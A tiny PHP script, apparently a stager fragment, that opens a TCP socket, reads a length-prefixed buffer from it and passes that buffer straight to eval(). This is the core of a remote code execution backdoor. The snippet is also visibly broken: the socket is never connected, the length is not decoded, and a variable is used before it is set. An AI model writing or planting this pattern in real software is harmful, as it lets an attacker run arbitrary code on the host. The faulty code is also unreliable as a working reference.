<?php
$msgsock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
$len = socket_read($msgsock, 4);
$buffer = socket_read($msgsock, $len-strlen($buffer));
eval($buffer);
?>